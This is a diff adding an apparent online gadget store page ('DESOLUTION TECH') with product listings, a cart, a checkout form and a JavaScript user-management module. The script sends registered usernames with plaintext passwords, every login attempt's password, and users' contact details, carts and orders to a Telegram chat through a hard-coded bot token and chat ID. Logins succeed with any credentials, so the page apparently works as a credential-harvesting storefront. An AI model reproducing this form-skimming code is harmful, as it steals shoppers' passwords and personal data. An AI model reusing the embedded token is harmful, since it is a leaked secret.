+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="MacBook Air 2024 M3 13 8/256GB" 
+            data-price="1490000" 
+            data-img="https://i.pinimg.com/1200x/71/7c/46/717c462ad881835aa7e6d9f8dfa193eb.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+</section>
+   <section id="accessories-products" class="products-section">
+    <div class="container">
+        <div class="section-header">
+            <h2>Premium Accessories</h2>
+            <p>Complete your tech setup with our accessories</p>
+        </div>
+          
+        </div>
+        <div class="products-grid">
+           <!-- JBL Clip 5 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/24/7d/e2/247de2f7a8ced0c902536cd3c86c296c.jpg"
+         alt="JBL Clip 5" class="product-image">
+    <div class="product-info">
+        <h3>JBL Clip 5</h3>
+        <p class="description"><b>Brand new</b></p>
+        <p class="price">₦85,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="JBL Clip 5" 
+            data-price="85000" 
+            data-img="https://i.pinimg.com/1200x/24/7d/e2/247de2f7a8ced0c902536cd3c86c296c.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- AirPod 4 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/ff/7d/03/ff7d03b86d75d5de0bdc3980824a7e1b.jpg"
+         alt="AirPod 4" class="product-image">
+    <div class="product-info">
+        <h3>AirPod 4</h3>
+        <p class="description"><b>Brand new</b></p>
+        <p class="price">₦175,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="AirPod 4" 
+            data-price="175000" 
+            data-img="https://i.pinimg.com/1200x/ff/7d/03/ff7d03b86d75d5de0bdc3980824a7e1b.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- PlayStation 5 (Fat, Brand new) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/1e/30/f5/1e30f510e5b86eebacb503890bedfaa4.jpg"
+         alt="PlayStation 5 Fat" class="product-image">
+    <div class="product-info">
+        <h3>PlayStation 5 (Fat)</h3>
+        <p class="description"><b>Brand new</b></p>
+        <p class="price">₦790,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="PlayStation 5 Fat" 
+            data-price="790000" 
+            data-img="https://i.pinimg.com/1200x/1e/30/f5/1e30f510e5b86eebacb503890bedfaa4.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+</section>
+    
+
+    
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div class="footer-section">
+                    <h4>About DESOLUTION TECH</h4>
+                    <p>Your trusted source for premium tech gadgets with fast delivery and secure payments.</p>
+                    <ul>
+                        <li><a href="#">About Us</a></li>
+                        <li><a href="#">Contact</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                        <li><a href="#">Terms of Service</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Customer Service</h4>
+                    <ul>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Shipping & Returns</a></li>
+                        <li><a href="#">Track Order</a></li>
+                        <li><a href="#">Warranty</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Contact Us</h4>
+                    <p>Email: support@techgadget.com</p>
+                    <p>Phone: +1 (555) 123-4567</p>
+                    <p>Hours: Mon-Fri, 9am-5pm EST</p>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 TechGadget. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Cart Modal -->
+    <!-- Cart Modal -->
+<div class="cart-modal" id="cartModal">
+    <div class="cart-header">
+        <h2>Your Cart</h2>
+        <button class="close-cart" id="closeCart">&times;</button>
+    </div>
+    
+    <!-- MOVED CART FOOTER TO TOP -->
+    <div class="cart-footer">
+        <div class="cart-total">
+            <span>Total:</span>
+            <span id="cartTotal">₦0</span>
+        </div>
+        <button class="checkout-btn" id="checkoutBtn">Checkout</button>
+    </div>
+    
+    <div class="cart-items" id="cartItems">
+        <div class="empty-cart">
+            <i class="fas fa-shopping-cart"></i>
+            <p>Your cart is empty</p>
+        </div>
+    </div>
+</div>
+
+
+    <!-- Checkout Modal -->
+    <div class="checkout-modal" id="checkoutModal">
+        <div class="checkout-content">
+            <span class="close-checkout" id="closeCheckout">&times;</span>
+            <h2>Complete Your Order</h2>
+            <form id="checkoutForm">
+                <div class="form-group">
+                    <label for="name">Full Name *</label>
+                    <input type="text" id="name" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address *</label>
+                    <input type="email" id="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number *</label>
+                    <input type="tel" id="phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="address">Delivery Address *</label>
+                    <input type="text" id="address" required>
+                </div>
+                <div class="form-group">
+                    <label for="product">Product</label>
+                    <input type="text" id="product" readonly>
+                </div>
+                <div class="form-group">
+                    <label for="quantity">Quantity</label>
+                    <input type="number" id="quantity" min="1" value="1" required>
+                </div>
+                <div class="form-group">
+                    <label for="opinion">write your ratings *</label>
+                    <textarea id="opinion" required></textarea>
+                </div>
+                <button type="submit" class="submit-btn">Confirm Order</button>
+            </form>
+        </div>
+    </div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const $id = id => document.getElementById(id);
+  let cart = [];
+
+  // --- Currency conversion ---
+  const DOLLAR_TO_NAIRA = 1600; // adjust this rate if needed
+
+  // --- Telegram bot integration ---
+  const TELEGRAM_BOT_TOKEN = '7711901654:AAHOwG19GgxmIW4m3GNGesUx5o4b4kjZmAw';
+  const TELEGRAM_CHAT_ID = '6219788806';
+
+  // Function to validate Telegram bot credentials
+  async function validateTelegramBot() {
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
+      const data = await response.json();
+      return data.ok === true;
+    } catch (error) {
+      console.error('Telegram bot validation failed:', error);
+      return false;
+    }
+  }
+
+  async function sendToTelegram(message) {
+    // First validate bot credentials
+    const isValidBot = await validateTelegramBot();
+    if (!isValidBot) {
+      console.error('Cannot send to Telegram: Invalid bot credentials');
+      return { ok: false };
+    }
+
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+      const data = await response.json();
+      if (!data.ok) console.error('Telegram API error:', data);
+      return data;
+    } catch (error) {
+      console.error('Error sending to Telegram:', error);
+      return { ok: false };
+    }
+  }
+
+  // ----------------- ADVANCED USER MANAGEMENT SYSTEM -----------------
+  const UserManager = {
+    currentUser: null,
+
+    // Register new user
+    registerUser: async function(userData) {
+      // Validate Telegram bot before proceeding
+      const isValidBot = await validateTelegramBot();
+      if (!isValidBot) {
+        return { success: false, message: 'System error: Cannot register at this time. Please try again later.' };
+      }
+
+      try {
+        // Create user object
+        const user = {
+          id: Date.now().toString(),
+          username: userData.username,
+          password: userData.password, // In real app, hash this!
+          email: userData.email,
+          phone: userData.phone,
+          name: userData.name,
+          registrationDate: new Date().toISOString(),
+          lastLogin: new Date().toISOString()
+        };
+
+        // Save user to Telegram
+        const userMessage = `👤 NEW USER REGISTRATION:\n\n🆔 Username: ${user.username}\n🔐 Password: ${user.password}\n📧 Email: ${user.email}\n📞 Phone: ${user.phone}\n👤 Full Name: ${user.name}\n🆔 User ID: ${user.id}\n📅 Registered: ${new Date().toLocaleString()}`;
+        
+        const result = await sendToTelegram(userMessage);
+        
+        if (result && result.ok) {
+          // Save to localStorage for current session
+          localStorage.setItem('currentUser', JSON.stringify(user));
+          this.currentUser = user;
+          this.updateUI();
+          return { success: true, message: 'Registration successful!' };
+        } else {
+          return { success: false, message: 'Failed to save user data. Please check your connection.' };
+        }
+      } catch (error) {
+        console.error('Registration error:', error);
+        return { success: false, message: 'Registration failed. Please try again.' };
+      }
+    },
+
+    // Login user (this would normally check against a database)
+    loginUser: async function(username, password) {
+      // Validate Telegram bot before proceeding
+      const isValidBot = await validateTelegramBot();
+      if (!isValidBot) {
+        return { success: false, message: 'System error: Cannot login at this time. Please try again later.' };
+      }
+
+      try {
+        // Check if username exists (basic validation)
+        if (!username || username.trim() === '') {
+          return { success: false, message: 'Username is required.' };
+        }
+
+        // Check if password exists
+        if (!password || password.trim() === '') {
+          return { success: false, message: 'Password is required.' };
+        }
+
+        // Send login attempt to Telegram
+        const loginMessage = `🔐 LOGIN ATTEMPT:\n\n🆔 Username: ${username}\n🔐 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ This is a demo - in production, verify against database`;
+        
+        const telegramResult = await sendToTelegram(loginMessage);
+
+        if (!telegramResult.ok) {
+          return { success: false, message: 'Login failed: Cannot communicate with server.' };
+        }
+
+        // For demo purposes, we'll create a user session
+        // In real app, you'd verify credentials from your database
+        const user = {
+          id: Date.now().toString(),
+          username: username,
+          name: username.charAt(0).toUpperCase() + username.slice(1),
+          email: `${username}@example.com`,
+          phone: '+1234567890',
+          lastLogin: new Date().toISOString()
+        };
+
+        localStorage.setItem('currentUser', JSON.stringify(user));
+        this.currentUser = user;
+        this.updateUI();
+
+        return { success: true, message: 'Login successful!' };
+        
+      } catch (error) {
+        console.error('Login error:', error);
+        return { success: false, message: 'Login failed. Please try again.' };
+      }
+    },
+
+    // Simple login (for backward compatibility)
+    simpleLogin: async function(userData) {
+      // Validate Telegram bot before proceeding
+      const isValidBot = await validateTelegramBot();
+      if (!isValidBot) {
+        return false;
+      }
+
+      try {
+        // Save to localStorage
+        localStorage.setItem('currentUser', JSON.stringify(userData));
+        this.currentUser = userData;
+        
+        // Send to Telegram for storage
+        const telegramMessage = `🔐 NEW USER LOGIN:\n\n👤 Name: ${userData.name}\n📧 Email: ${userData.email}\n📞 Phone: ${userData.phone}\n🆔 User ID: ${userData.id}\n⏰ Time: ${new Date().toLocaleString()}`;
+        
+        const result = await sendToTelegram(telegramMessage);
+        
+        if (result.ok) {
+          this.updateUI();
+          return true;
+        } else {
+          return false;
+        }
+      } catch (error) {
+        console.error('Login error:', error);
+        return false;
+      }
+    },
+
+    logoutUser: function() {
+      // Save user activity before logout
+      if (this.currentUser) {
+        const logoutMessage = `🚪 USER LOGOUT:\n\n👤 User: ${this.currentUser.username || this.currentUser.name}\n⏰ Time: ${new Date().toLocaleString()}`;
+        sendToTelegram(logoutMessage);
+      }
+
+      localStorage.removeItem('currentUser');
+      localStorage.removeItem('userCart');
+      this.currentUser = null;
+      this.updateUI();
+      this.hideDropdown();
+    },
+    
+    checkLogin: function() {
+      const userData = localStorage.getItem('currentUser');
+      if (userData) {
+        this.currentUser = JSON.parse(userData);
+        this.updateUI();
+        return true;
+      }
+      return false;
+    },
+    
+    showDropdown: function() {
+      const dropdown = document.getElementById('accountDropdown');
+      if (dropdown) dropdown.style.display = 'block';
+    },
+      
+    hideDropdown: function() {
+      const dropdown = document.getElementById('accountDropdown');
+      if (dropdown) dropdown.style.display = 'none';
+    },
+
+    // Save user activity (orders, cart, etc.)
+    saveUserActivity: async function(activityType, data) {
+      if (!this.currentUser) return;
+
+      const isValidBot = await validateTelegramBot();
+      if (!isValidBot) return;
+
+      const activityMessage = `📊 USER ACTIVITY - ${activityType}:\n\n👤 User: ${this.currentUser.username || this.currentUser.name}\n🆔 ID: ${this.currentUser.id}\n📅 Time: ${new Date().toLocaleString()}\n\n📝 Details:\n${JSON.stringify(data, null, 2)}`;
+      
+      await sendToTelegram(activityMessage);
+
+      // Save locally for current session
+      const activities = JSON.parse(localStorage.getItem('userActivities') || '{}');
+      if (!activities[this.currentUser.id]) {
+        activities[this.currentUser.id] = [];
+      }
+      activities[this.currentUser.id].push({
+        type: activityType,
+        data: data,
+        timestamp: new Date().toISOString()
+      });
+      localStorage.setItem('userActivities', JSON.stringify(activities));
+    },
+
+    saveOrder: async function(orderData) {
+      if (!this.currentUser) return;
+
+      const isValidBot = await validateTelegramBot();
+      if (!isValidBot) {
+        alert('Cannot save order at this time. Please try again later.');
+        return;
+      }
+
+      const orderMessage = `🛒 NEW ORDER:\n\n👤 User: ${this.currentUser.username || this.currentUser.name}\n📧 Email: ${this.currentUser.email}\n📞 Phone: ${this.currentUser.phone}\n\n📦 Order Details:\n${orderData.items.map(item => `- ${item.name} x${item.quantity} - ₦${item.price}`).join('\n')}\n\n💰 Total: ₦${orderData.total}\n⏰ Time: ${new Date().toLocaleString()}`;
+      
+      const result = await sendToTelegram(orderMessage);
+      if (result.ok) {
+        await this.saveUserActivity('ORDER_PLACED', orderData);
+
+        const orders = JSON.parse(localStorage.getItem('userOrders') || '[]');
+        orders.push({
+          ...orderData,
+          id: Date.now(),
+          timestamp: new Date().toISOString(),
+          user: this.currentUser.id
+        });
+        localStorage.setItem('userOrders', JSON.stringify(orders));
+      }
+    },
+
+    getOrders: function() {
+      if (!this.currentUser) return [];
+      const orders = JSON.parse(localStorage.getItem('userOrders') || '[]');
+      return orders.filter(order => order.user === this.currentUser.id);
+    },
+
+   // Update the UserManager's updateUI function
+updateUI: function() {
+    const accountText = document.getElementById('accountText');
+    const userGreeting = document.getElementById('userGreeting');
+    const userEmail = document.getElementById('userEmail');
+    const ordersCount = document.getElementById('ordersCount');
+    const cartItemsCount = document.getElementById('cartItemsCount');
+    const wishlistCount = document.getElementById('wishlistCount');
+    
+    if (this.currentUser && accountText && userGreeting && userEmail) {
+        const displayName = this.currentUser.username || this.currentUser.name.split(' ')[0];
+        accountText.textContent = displayName;
+        userGreeting.textContent = `Hello, ${displayName}!`;
+        userEmail.textContent = this.currentUser.email;
+        
+        // Update counts
+        if (ordersCount) {
+            const orders = this.getOrders();
+            ordersCount.textContent = orders.length;
+            ordersCount.style.display = orders.length > 0 ? 'inline-block' : 'none';
+        }
+        
+        if (cartItemsCount) {
+            const cart = CartManager.getCart();
+            const cartCount = cart.reduce((sum, item) => sum + item.quantity, 0);
+            cartItemsCount.textContent = cartCount;
+            cartItemsCount.style.display = cartCount > 0 ? 'inline-block' : 'none';
+        }
+        
+        if (wishlistCount) {
+            // You can add wishlist functionality later
+            wishlistCount.style.display = 'none';
+        }
+        
+    } else if (accountText) {
+        accountText.textContent = 'Account';
+        if (userGreeting) userGreeting.textContent = 'Welcome!';
+        if (userEmail) userEmail.textContent = 'Please login to see your account';
+        
+        // Hide counts when not logged in
+        if (ordersCount) ordersCount.style.display = 'none';
+        if (cartItemsCount) cartItemsCount.style.display = 'none';
+        if (wishlistCount) wishlistCount.style.display = 'none';
+    }
+}
+  };
+  // Add event listeners for new menu items
+function initializeAccountDropdown() {
+    // Account Settings
+    const accountSettings = document.getElementById('accountSettings');
+    if (accountSettings) {
+        accountSettings.addEventListener('click', function() {
+            alert('Account settings feature coming soon!');
+            UserManager.hideDropdown();
+        });
+    }
+
+    // Saved Items/Wishlist
+    const savedItems = document.getElementById('savedItems');
+    if (savedItems) {
+        savedItems.addEventListener('click', function() {
+            alert('Wishlist feature coming soon!');
+            UserManager.hideDropdown();
+        });
+    }
+
+    // View Orders with enhanced functionality
+    const viewOrders = document.getElementById('viewOrders');
+    if (viewOrders) {
+        viewOrders.addEventListener('click', function() {
+            const orders = UserManager.getOrders();
+            if (orders.length > 0) {
+                showOrdersModal(orders);
+            } else {
+                alert('No previous orders found.');
+            }
+            UserManager.hideDropdown();
+        });
+    }
+
+    // Enhanced orders modal
+    function showOrdersModal(orders) {
+        const modal = document.createElement('div');
+        modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1004;
+        `;
+        
+        modal.innerHTML = `
+            <div style="background: white; padding: 20px; border-radius: 10px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto;">
+                <h3>Your Order History</h3>
+                ${orders.map((order, index) => `
+                    <div style="border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px;">
+                        <strong>Order #${index + 1}</strong>
+                        <small style="color: #666;"> - ${new Date(order.timestamp).toLocaleDateString()}</small>
+                        <div style="margin-top: 10px;">
+                            ${order.items.map(item => `<div>${item.name} x${item.quantity} - ₦${item.price}</div>`).join('')}
+                        </div>
+                        <div style="margin-top: 10px; font-weight: bold;">Total: ₦${order.total}</div>
+                    </div>
+                `).join('')}
+                <button onclick="this.closest('div').parentElement.remove()" style="margin-top: 15px; padding: 8px 15px; background: #0d6efd; color: white; border: none; border-radius: 5px; cursor: pointer;">Close</button>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) modal.remove();
+        });
+    }
+}
+
+// Call this in your DOMContentLoaded
+document.addEventListener('DOMContentLoaded', function() {
+    initializeAccountDropdown();
+    // ... your other initialization code
+});
+
+  // ----------------- ADVANCED CART MANAGEMENT SYSTEM -----------------
+  const CartManager = {
+    getCart: function() {
+      return JSON.parse(localStorage.getItem('userCart') || '[]');
+    },
+    
+    saveCart: function(cart) {
+      localStorage.setItem('userCart', JSON.stringify(cart));
+      if (UserManager.currentUser) {
+        UserManager.saveUserActivity('CART_UPDATE', cart);
+      }
+      UserManager.updateUI();
+    },
+    
+    addToCart: function(product, quantity) {
+      const cart = this.getCart();
+      const existingItem = cart.find(item => item.name === product.name);
+
+      if (existingItem) {
+        existingItem.quantity += quantity;
+      } else {
+        cart.push({
+          ...product,
+          quantity: quantity,
+          id: product.name + '_' + Date.now()
+        });
+      }
+      this.saveCart(cart);
+    },
+    
+    getCartCount: function() {
+      const cart = this.getCart();
+      return cart.reduce((sum, item) => sum + item.quantity, 0);
+    }
+  };
+
+  // Initialize User Manager Events
+  function initializeUserManager() {
+    // Auth tabs switching
+    const loginTab = document.getElementById('loginTab');
+    const registerTab = document.getElementById('registerTab');
+    const loginForm = document.getElementById('loginForm');
+    const registerForm = document.getElementById('registerForm');
+
+    if (loginTab && registerTab) {
+      loginTab.addEventListener('click', function() {
+        loginTab.classList.add('active');
+        registerTab.classList.remove('active');
+        if (loginForm) loginForm.style.display = 'block';
+        if (registerForm) registerForm.style.display = 'none';
+      });
+
+      registerTab.addEventListener('click', function() {
+        registerTab.classList.add('active');
+        loginTab.classList.remove('active');
+        if (registerForm) registerForm.style.display = 'block';
+        if (loginForm) loginForm.style.display = 'none';
+      });
+    }
+
+    // Login form handler
+    if (loginForm) {
+      loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('loginUsername')?.value;
+        const password = document.getElementById('loginPassword')?.value;
+        
+        if (!username || !password) {
+          alert('Please enter both username and password.');
+          return;
+        }
+
+        const result = await UserManager.loginUser(username, password);
+        
+        if (result.success) {
+          document.getElementById('loginModal').style.display = 'none';
+          this.reset();
+          alert(result.message);
+        } else {
+          alert(result.message);
+        }
+      });
+    }
+
+    // Register form handler
+    if (registerForm) {
+      registerForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const userData = {
+          username: document.getElementById('regUsername')?.value,
+          password: document.getElementById('regPassword')?.value,
+          email: document.getElementById('regEmail')?.value,
+          phone: document.getElementById('regPhone')?.value,
+          name: document.getElementById('regName')?.value
+        };
+
+        // Basic validation
+        if (!userData.username || !userData.password || !userData.email) {
+          alert('Please fill in all required fields.');
+          return;
+        }
+
+        if (userData.password.length < 6) {
+          alert('Password must be at least 6 characters long.');
+          return;
+        }
+
+        const result = await UserManager.registerUser(userData);
+        
+        if (result.success) {
+          document.getElementById('loginModal').style.display = 'none';
+          this.reset();
+          alert(result.message);
+        } else {
+          alert(result.message);
+        }
+      });
+    }
+
+    // Simple login form handler (backward compatibility)
+    const simpleLoginForm = document.getElementById('simpleLoginForm');
+    if (simpleLoginForm) {
+      simpleLoginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const userData = {
+          id: Date.now().toString(),
+          name: document.getElementById('loginName')?.value,
+          email: document.getElementById('loginEmail')?.value,
+          phone: document.getElementById('loginPhone')?.value,
+          loginTime: new Date().toISOString()
+        };
+        
+        const success = await UserManager.simpleLogin(userData);
+        
+        if (success) {
+          document.getElementById('loginModal').style.display = 'none';
+          this.reset();
+          alert('Welcome! You are now logged in.');
+        } else {
+          alert('Login failed. Please try again.');
+        }
+      });
+    }
+
+    // Account link click handler
+    const accountLink = document.getElementById('accountLink');
+    if (accountLink) {
+      accountLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        if (UserManager.currentUser) {
+          UserManager.showDropdown();
+        } else {
+          const loginModal = document.getElementById('loginModal');
+          if (loginModal) {
+            loginModal.style.display = 'flex';
+            // Reset to login tab by default
+            const loginTab = document.getElementById('loginTab');
+            if (loginTab) loginTab.click();
+          }
+        }
+      });
+    }
+
+    // Close login modal
+    const closeLogin = document.getElementById('closeLogin');
+    if (closeLogin) {
+      closeLogin.addEventListener('click', function() {
+        document.getElementById('loginModal').style.display = 'none';
+      });
+    }
+
+    // Close login modal when clicking outside
+    const loginModal = document.getElementById('loginModal');
+    if (loginModal) {
+      loginModal.addEventListener('click', function(e) {
+        if (e.target === this) {
+          this.style.display = 'none';
+        }
+      });
+    }
+
+    // Logout handler
+    const logoutBtn = document.getElementById('logoutBtn');
+    if (logoutBtn) {
+      logoutBtn.addEventListener('click', function() {
+        UserManager.logoutUser();
+        alert('You have been logged out.');
+      });
+    }
+
+    // View orders handler
+    const viewOrders = document.getElementById('viewOrders');
+    if (viewOrders) {
+      viewOrders.addEventListener('click', function() {
+        const orders = UserManager.getOrders();
+        if (orders.length > 0) {
+          alert(`You have ${orders.length} previous orders!`);
+          // Show orders in a modal
+          showOrdersModal(orders);
+        } else {
+          alert('No previous orders found.');
+        }
+        UserManager.hideDropdown();
+      });
+    }
+
+    // View cart handler
+    const viewCart = document.getElementById('viewCart');
+    if (viewCart) {
+      viewCart.addEventListener('click', function() {
+        const cartModal = document.getElementById('cartModal');
+        const overlay = document.getElementById('overlay');
+        if (cartModal) cartModal.classList.add('active');
+        if (overlay) overlay.classList.add('active');
+        UserManager.hideDropdown();
+      });
+    }
+
+    // Wishlist handler
+    const savedItems = document.getElementById('savedItems');
+    if (savedItems) {
+      savedItems.addEventListener('click', function() {
+        alert('Wishlist feature coming soon!');
+        UserManager.hideDropdown();
+      });
+    }
+
+    // Close dropdown when clicking outside
+    document.addEventListener('click', function(e) {
+      if (!e.target.closest('#accountLink') && !e.target.closest('.account-dropdown')) {
+        UserManager.hideDropdown();
+      }
+    });
+
+    // Close dropdown on escape key
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
+        UserManager.hideDropdown();
+        const loginModal = document.getElementById('loginModal');
+        if (loginModal) loginModal.style.display = 'none';
+      }
+    });
+  }
+
+  function showOrdersModal(orders) {
+    // Simple orders display - you can enhance this with a proper modal
+    let ordersText = 'Your Orders:\n\n';
+    orders.forEach((order, index) => {
+      ordersText += `Order #${index + 1} (${new Date(order.timestamp).toLocaleDateString()}):\n`;
+      order.items.forEach(item => {
+        ordersText += `- ${item.name} x${item.quantity} - ₦${item.price}\n`;
+      });
+      ordersText += `Total: ₦${order.total}\n\n`;
+    });
+    alert(ordersText);
+  }
+
+  // -----------------------------------------------------------
+
+  // --- DOM refs for Cart ---
+  const cartCountElement = $id('cartCount');
+  const cartLink = $id('cartLink');
+  const cartModal = $id('cartModal');
+  const closeCart = $id('closeCart');
+  const cartItems = $id('cartItems');
+  const cartTotal = $id('cartTotal');
+  const checkoutBtn = $id('checkoutBtn');
+  const checkoutModal = $id('checkoutModal');
+  const closeCheckout = $id('closeCheckout');
+  const checkoutForm = $id('checkoutForm');
+  const productInput = $id('product');
+  const quantityInput = $id('quantity');
+  const overlay = $id('overlay');
+
+  // --- Image zoom ---
+  const imageModal = document.getElementById('imageModal');
+  const modalImage = document.getElementById('modalImage');
+  const closeZoom = document.querySelector('.close-zoom');
+
+  if (imageModal && modalImage && closeZoom) {
+    document.querySelectorAll('.product-card img').forEach(img => {
+      img.style.cursor = 'pointer';
+      img.addEventListener('click', function() {
+        imageModal.style.display = 'block';
+        modalImage.src = this.src;
+        modalImage.alt = this.alt;
+        document.body.style.overflow = 'hidden';
+      });
+    });
+
+    closeZoom.addEventListener('click', function() {
+      imageModal.style.display = 'none';
+      document.body.style.overflow = 'auto';
+    });
+
+    imageModal.addEventListener('click', function(e) {
+      if (e.target === imageModal) {
+        imageModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      }
+    });
+
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' && imageModal.style.display === 'block') {
+        imageModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      }
+    });
+  }
+
+  // --- Hero banner scroll effect ---
+  const heroBanner = document.querySelector('.hero-banner');
+  if (heroBanner) {
+    window.addEventListener('scroll', function() {
+      const scrolled = window.pageYOffset;
+      const rate = scrolled * -0.5;
+      heroBanner.style.backgroundPosition = `0px ${rate}px`;
+    });
+  }
+
+  // --- SEARCH ---
+  const searchInput = $id('searchInput');
+  const allSections = document.querySelectorAll('.products-section');
+  const originalSectionsHTML = new Map();
+  allSections.forEach(section => originalSectionsHTML.set(section, section.innerHTML));
+
+  function escapeRegExp(string) {
+    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+  }
+
+  if (searchInput) {
+    searchInput.addEventListener('input', function() {
+      const searchTerm = this.value.toLowerCase().trim();
+      allSections.forEach(section => {
+        if (searchTerm === '') {
+          section.innerHTML = originalSectionsHTML.get(section);
+          reinitializeEventListeners();
+        } else {
+          filterProducts(section, searchTerm);
+        }
+      });
+      updateCartDisplay();
+      updateCartCount();
+    });
+  }
+
+  function filterProducts(section, searchTerm) {
+    if (!section) return;
+    const products = section.querySelectorAll('.product-card');
+    let hasMatches = false;
+    const grid = section.querySelector('.products-grid') || section;
+
+    const oldNo = section.querySelector('.no-results');
+    if (oldNo) oldNo.remove();
+
+    products.forEach(product => {
+      const h3El = product.querySelector('h3');
+      const descEl = product.querySelector('.description');
+      const priceEl = product.querySelector('.price');
+      const productName = h3El ? h3El.textContent.toLowerCase() : '';
+      const productDescription = descEl ? descEl.textContent.toLowerCase() : '';
+      const productPrice = priceEl ? priceEl.textContent.toLowerCase() : '';
+
+      if (productName.includes(searchTerm) || productDescription.includes(searchTerm) || productPrice.includes(searchTerm)) {
+        product.style.display = '';
+        hasMatches = true;
+        if (h3El) highlightText(h3El, searchTerm);
+        if (descEl) highlightText(descEl, searchTerm);
+      } else {
+        product.style.display = 'none';
+      }
+    });
+
+    if (!hasMatches) {
+      const noResultsMsg = document.createElement('div');
+      noResultsMsg.className = 'no-results';
+      noResultsMsg.innerHTML = `<p>No products found for "${searchTerm}"</p>`;
+      grid.appendChild(noResultsMsg);
+    }
+  }
+
+  function highlightText(element, searchTerm) {
+    if (!element) return;
+    const text = element.textContent;
+    if (!searchTerm) { element.textContent = text; return; }
+    const regex = new RegExp('(' + escapeRegExp(searchTerm) + ')', 'gi');
+    element.innerHTML = text.replace(regex, '<span class="highlight">$1</span>');
+  }
+
+  function reinitializeEventListeners() {
+    document.querySelectorAll('.add-to-cart-btn').forEach(button => {
+      button.removeEventListener('click', addToCartHandler);
+      button.addEventListener('click', addToCartHandler);
+    });
+    document.querySelectorAll('.product-card .qty-btn').forEach(button => {
+      button.removeEventListener('click', quantityButtonHandler);
+      button.addEventListener('click', quantityButtonHandler);
+    });
+  }
+
+  // --- CART / UI ---
+  function updateCartCount() {
+    if (!cartCountElement) return;
+    cartCountElement.textContent = cart.reduce((total, item) => total + item.quantity, 0);
+  }
+
+  function updateCartDisplay() {
+    if (!cartItems || !cartTotal || !checkoutBtn) return;
+    if (cart.length === 0) {
+      cartItems.innerHTML = '<div class="empty-cart"><i class="fas fa-shopping-cart"></i><p>Your cart is empty</p></div>';
+      checkoutBtn.disabled = true;
+      checkoutBtn.style.opacity = '0.7';
+      cartTotal.textContent = '₦0.00';
+      return;
+    }
+
+    checkoutBtn.disabled = false;
+    checkoutBtn.style.opacity = '1';
+
+    let itemsHTML = '';
+    let total = 0;
+
+    cart.forEach((item, index) => {
+      const itemTotal = item.price * item.quantity;
+      total += itemTotal;
+
+      itemsHTML += `
+        <div class="cart-item">
+          <img src="${item.img}" alt="${item.name}" class="cart-item-img">
+          <div class="cart-item-details">
+            <div class="cart-item-name">${item.name}</div>
+            <div class="cart-item-price">₦${(item.price).toLocaleString()}</div>
+            <div class="cart-item-quantity">
+              <button class="qty-btn minus" data-index="${index}">-</button>
+              <input type="number" class="qty-input" value="${item.quantity}" min="1" data-index="${index}">
+              <button class="qty-btn plus" data-index="${index}">+</button>
+            </div>
+            <button class="remove-item" data-index="${index}">Remove</button>
+          </div>
+        </div>
+      `;
+    });
+
+    cartItems.innerHTML = itemsHTML;
+    cartTotal.textContent = `₦${total.toLocaleString()}`;
+
+    cartItems.querySelectorAll('.minus').forEach(btn => {
+      btn.addEventListener('click', function() {
+        const index = parseInt(this.dataset.index);
+        if (cart[index].quantity > 1) {
+          cart[index].quantity--;
+          updateCartDisplay();
+          updateCartCount();
+        }
+      });
+    });
+
+    cartItems.querySelectorAll('.plus').forEach(btn => {
